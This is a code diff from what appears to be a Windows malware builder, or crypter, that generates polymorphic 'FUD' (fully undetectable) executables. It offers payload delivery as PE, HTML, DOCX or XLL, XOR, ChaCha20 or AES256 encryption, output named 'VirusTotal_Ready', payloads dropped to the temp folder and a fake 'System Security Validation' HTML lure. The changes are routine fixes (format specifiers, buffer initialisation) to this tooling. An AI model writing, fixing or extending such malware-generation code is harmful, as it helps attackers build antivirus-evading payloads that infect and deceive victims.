@@ -260,7 +260,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
                             "void execute_html_delivery() {\n"
             "    char html_content[8192];\n"
             "    char validation_id[64];\n"
-                "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%llu\", GetTickCount64());\n"
+                "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%I64u\", GetTickCount64());\n"
                 "    sprintf_s(html_content, sizeof(html_content),\n"
                 "        \"<html><head><title>System Security Validation</title></head>\"\n"
                 "        \"<body style='font-family:Arial;text-align:center;padding:50px;'>\"\n"
@@ -368,7 +368,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
                     "    char temp_path[MAX_PATH];\n"
                     "    GetTempPathA(MAX_PATH, temp_path);\n"
                                     "    char temp_file[MAX_PATH];\n"
-                "    sprintf_s(temp_file, sizeof(temp_file), \"%s\\\\enterprise_payload_%llu.exe\", temp_path, GetTickCount64());\n"
+                "    sprintf_s(temp_file, sizeof(temp_file), \"%s\\\\enterprise_payload_%I64u.exe\", temp_path, GetTickCount64());\n"
                     "    \n"
                     "    // Write actual payload data to file (only the real payload, not padding)\n"
                     "    FILE* payload_file = NULL;\n"
@@ -467,6 +467,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
         
         payloadByteArray = (char*)malloc(arraySize);
         if (payloadByteArray) {
+            memset(payloadByteArray, 0, arraySize); // Initialize buffer
             sprintf_s(payloadByteArray, arraySize, 
                 "// Embedded payload data with enterprise security padding\n"
                 "#define PAYLOAD_SIZE %zu\n"
@@ -512,6 +513,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
         
         payloadByteArray = (char*)malloc(arraySize);
         if (payloadByteArray) {
+            memset(payloadByteArray, 0, arraySize); // Initialize buffer
             sprintf_s(payloadByteArray, arraySize,
                 "// Enterprise security validation data\n"
                 "#define VALIDATION_DATA_SIZE %zu\n"
@@ -730,7 +732,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         
         // Create temporary source file
         char tempSource[256];
-        sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%llu_%d.cpp", GetTickCount64(), batch);
+        sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%I64u_%d.cpp", GetTickCount64(), batch);
         
         // Write source file
         FILE* file = NULL;
@@ -748,7 +750,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 const char* delNames[] = {"Benign", "PE", "HTML", "DOCX", "XLL"};
                 const char* encNames[] = {"None", "XOR", "ChaCha20", "AES256"};
                                 sprintf_s(finalExecutablePath, sizeof(finalExecutablePath),
-                    "VS2022_FUD_%s_%s_%llu_%d.exe",
+                    "VS2022_FUD_%s_%s_%I64u_%d.exe",
                     delNames[delType], encNames[encType], GetTickCount64(), batch + 1);
             } else {
                 strcpy_s(finalExecutablePath, sizeof(finalExecutablePath), outputPath);
@@ -907,7 +909,7 @@ static void generateFUDExecutable() {
     
     // Auto-generate path if empty
     if (strlen(outputPath) == 0) {
-        sprintf_s(outputPath, sizeof(outputPath), "VS2022_FUD_VirusTotal_Ready_%llu.exe", GetTickCount64());
+        sprintf_s(outputPath, sizeof(outputPath), "VS2022_FUD_VirusTotal_Ready_%I64u.exe", GetTickCount64());
         SetWindowTextAnsi(hOutputPath, outputPath);
     }
     
